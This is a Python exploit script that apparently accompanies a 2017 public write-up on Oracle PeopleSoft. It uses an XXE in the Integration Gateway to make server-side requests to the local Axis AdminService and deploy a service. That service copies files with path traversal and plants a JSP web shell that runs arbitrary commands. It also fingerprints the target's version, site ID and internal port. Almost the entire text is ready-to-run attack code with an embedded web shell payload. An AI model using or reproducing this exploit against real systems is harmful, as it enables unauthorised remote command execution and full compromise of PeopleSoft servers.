# Oracle PeopleSoft SYSTEM RCE
# https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
# cf
# 2017-05-17
 
import requests
import urllib.parse
import re
import string
import random
import sys
 
 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
try:
    import colorama
except ImportError:
    colorama = None
else:
    colorama.init()
 
    COLORS = {
        &#039;+&#039;: colorama.Fore.GREEN,
        &#039;-&#039;: colorama.Fore.RED,
        &#039;:&#039;: colorama.Fore.BLUE,
        &#039;!&#039;: colorama.Fore.YELLOW
    }
 
 
URL = sys.argv[1].rstrip(&#039;/&#039;)
CLASS_NAME = &#039;org.apache.pluto.portalImpl.Deploy&#039;
PROXY = &#039;localhost:8080&#039;
 
# shell.jsp?c=whoami
PAYLOAD = &#039;<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>&#039;
 
 
class Browser:
    """Wrapper around requests.
    """
 
    def __init__(self, url):
        self.url = url
        self.init()
 
    def init(self):
        self.session = requests.Session()
        self.session.proxies = {
            &#039;http&#039;: PROXY,
            &#039;https&#039;: PROXY
        }
        self.session.verify = False
 
    def get(self, url ,*args, **kwargs):
        return self.session.get(url=self.url + url, *args, **kwargs)
 
    def post(self, url, *args, **kwargs):
        return self.session.post(url=self.url + url, *args, **kwargs)
 
    def matches(self, r, regex):
        return re.findall(regex, r.text)
 
 
class Recon(Browser):
    """Grabs different informations about the target.
    """
 
    def check_all(self):
        self.site_id = None
        self.local_port = None
        self.check_version()
        self.check_site_id()
        self.check_local_infos()
 
    def check_version(self):
        """Grabs PeopleTools&#039; version.
        """
        self.version = None
        r = self.get(&#039;/PSEMHUB/hub&#039;)
        m = self.matches(r, &#039;Registered Hosts Summary - ([0-9\.]+).</b>&#039;)
 
        if m:
            self.version = m[0]
            o(&#039;:&#039;, &#039;PTools version: %s&#039; % self.version)
        else:
            o(&#039;-&#039;, &#039;Unable to find version&#039;)
 
    def check_site_id(self):
        """Grabs the site ID and the local port.
        """
        if self.site_id:
            return
 
        r = self.get(&#039;/&#039;)
        m = self.matches(r, &#039;/([^/]+)/signon.html&#039;)
 
        if not m:
            raise RuntimeError(&#039;Unable to find site ID&#039;)
 
        self.site_id = m[0]
        o(&#039;+&#039;, &#039;Site ID: &#039; + self.site_id)
 
    def check_local_infos(self):
        """Uses cookies to leak hostname and local port.
        """
        if self.local_port:
            return
 
        r = self.get(&#039;/psp/%s/signon.html&#039; % self.site_id)
 
        for c, v in self.session.cookies.items():
            if c.endswith(&#039;-PORTAL-PSJSESSIONID&#039;):
                self.local_host, self.local_port, *_ = c.split(&#039;-&#039;)
                o(&#039;+&#039;, &#039;Target: %s:%s&#039; % (self.local_host, self.local_port))
                return
 
        raise RuntimeError(&#039;Unable to get local hostname / port&#039;)
 
 
class AxisDeploy(Recon):
    """Uses the XXE to install Deploy, and uses its two useful methods to get
    a shell.
    """
 
    def init(self):
        super().init()
        self.service_name = &#039;YZWXOUuHhildsVmHwIKdZbDCNmRHznXR&#039; #self.random_string(10)
 
    def random_string(self, size):
        return &#039;&#039;.join(random.choice(string.ascii_letters) for _ in range(size))
 
    def url_service(self, payload):
        return &#039;http://localhost:%s/pspc/services/AdminService?method=%s&#039; % (
            self.local_port,
            urllib.parse.quote_plus(self.psoap(payload))
        )
 
    def war_path(self, name):
        # This is just a guess from the few PeopleSoft instances we audited.
        # It might be wrong.
        suffix = &#039;.war&#039; if self.version and self.version >= &#039;8.50&#039; else &#039;&#039;
        return &#039;./applications/peoplesoft/%s%s&#039; % (name, suffix)
 
    def pxml(self, payload):
        """Converts an XML payload into a one-liner.
        """
        payload = payload.strip().replace(&#039;\n&#039;, &#039; &#039;)
        payload = re.sub(&#039;\s+<&#039;, &#039;<&#039;, payload, flags=re.S)
        payload = re.sub(&#039;\s+&#039;, &#039; &#039;, payload, flags=re.S)
        return payload
 
    def psoap(self, payload):
        """Converts a SOAP payload into a one-liner, including the comment trick
        to allow attributes.
        """
        payload = self.pxml(payload)
        payload = &#039;!-->%s&#039; % payload[:-1]
        return payload
 
    def soap_service_deploy(self):
        """SOAP payload to deploy the service.
        """
        return """
        <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="%s" provider="java:RPC">
                <ns1:parameter name="className" value="%s"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
        </ns1:deployment>
        """ % (self.service_name, CLASS_NAME)
 
    def soap_service_undeploy(self):
        """SOAP payload to undeploy the service.
        """
        return """
        <ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
        <ns1:service name="%s"/>
        </ns1:undeployment>
        """ % (self.service_name, )
 
    def xxe_ssrf(self, payload):
        """Runs the given AXIS deploy/undeploy payload through the XXE.
        """
        data = """
        <?xml version="1.0"?>
        <!DOCTYPE IBRequest [
        <!ENTITY x SYSTEM "%s">
        ]>
        <IBRequest>
           <ExternalOperationName>&x;</ExternalOperationName>
           <OperationType/>
           <From><RequestingNode/>
              <Password/>
              <OrigUser/>
              <OrigNode/>
              <OrigProcess/>
              <OrigTimeStamp/>
           </From>
           <To>
              <FinalDestination/>
              <DestinationNode/>
              <SubChannel/>
           </To>
           <ContentSections>
              <ContentSection>
                 <NonRepudiation/>
                 <MessageVersion/>
                 <Data>
                 </Data>
              </ContentSection>
           </ContentSections>
        </IBRequest>
        """ % self.url_service(payload)
        r = self.post(
            &#039;/PSIGW/HttpListeningConnector&#039;,
            data=self.pxml(data),
            headers={
                &#039;Content-Type&#039;: &#039;application/xml&#039;
            }
        )
 
    def service_check(self):
        """Verifies that the service is correctly installed.
        """
        r = self.get(&#039;/pspc/services&#039;)
        return self.service_name in r.text
 
    def service_deploy(self):
        self.xxe_ssrf(self.soap_service_deploy())
 
        if not self.service_check():
            raise RuntimeError(&#039;Unable to deploy service&#039;)
 
        o(&#039;+&#039;, &#039;Service deployed&#039;)
 
    def service_undeploy(self):
        if not self.local_port:
            return
 
        self.xxe_ssrf(self.soap_service_undeploy())
 
        if self.service_check():
            o(&#039;-&#039;, &#039;Unable to undeploy service&#039;)
            return
 
        o(&#039;+&#039;, &#039;Service undeployed&#039;)
 
    def service_send(self, data):
        """Send data to the Axis endpoint.
        """
        return self.post(
            &#039;/pspc/services/%s&#039; % self.service_name,
            data=data,
            headers={
                &#039;SOAPAction&#039;: &#039;useless&#039;,
                &#039;Content-Type&#039;: &#039;application/xml&#039;
            }
        )
 
    def service_copy(self, path0, path1):
        """Copies one file to another.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:copy
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <in0 xsi:type="xsd:string">%s</in0>
            <in1 xsi:type="xsd:string">%s</in1>
        </api:copy>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (path0, path1)
        response = self.service_send(data)
        return &#039;<ns1:copyResponse&#039; in response.text
 
    def service_main(self, tmp_path, tmp_dir):
        """Writes the payload at the end of the .xml file.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s.war</item>
                <item xsi:type="xsd:string">something</item>
                <item xsi:type="xsd:string">-addToEntityReg</item>
                <item xsi:type="xsd:string"><![CDATA[%s]]></item>
            </api:in0>
        </api:main>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
        response = self.service_send(data)
 
    def build_shell(self):
        """Builds a SYSTEM shell.
        """
        # On versions >= 8.50, using another extension than JSP got 70 bytes
        # in return every time, for some reason.
        # Using .jsp seems to trigger caching, thus the same pivot cannot be
        # used to extract several files.
        # Again, this is just from experience, nothing confirmed
        pivot = &#039;/%s.jsp&#039; % self.random_string(20)
        pivot_path = self.war_path(&#039;PSOL&#039;) + pivot
        pivot_url = &#039;/PSOL&#039; + pivot
 
        # 1: Copy portletentityregistry.xml to TMP
 
        per = &#039;/WEB-INF/data/portletentityregistry.xml&#039;
        per_path = self.war_path(&#039;pspc&#039;)
        tmp_path = &#039;../&#039; * 20 + &#039;TEMP&#039;
        tmp_dir = self.random_string(20)
        tmp_per = tmp_path + &#039;/&#039; + tmp_dir + per
 
        if not self.service_copy(per_path + per, tmp_per):
            raise RuntimeError(&#039;Unable to copy original XML file&#039;)
 
        # 2: Add JSP payload
        self.service_main(tmp_path, tmp_dir)
 
        # 3: Copy XML to JSP in webroot
        if not self.service_copy(tmp_per, pivot_path):
            raise RuntimeError(&#039;Unable to copy modified XML file&#039;)
 
        response = self.get(pivot_url)
 
        if response.status_code != 200:
            raise RuntimeError(&#039;Unable to access JSP shell&#039;)
 
        o(&#039;+&#039;, &#039;Shell URL: &#039; + self.url + pivot_url)
 
 
class PeopleSoftRCE(AxisDeploy):
    def __init__(self, url):
        super().__init__(url)
 
 
def o(s, message):
    if colorama:
        c = COLORS[s]
        s = colorama.Style.BRIGHT + COLORS[s] + &#039;|&#039; + colorama.Style.RESET_ALL
    print(&#039;%s %s&#039; % (s, message))
 
 
x = PeopleSoftRCE(URL)
 
try:
    x.check_all()
    x.service_deploy()
    x.build_shell()
except RuntimeError as e:
    o(&#039;-&#039;, e)
finally:
    x.service_undeploy()

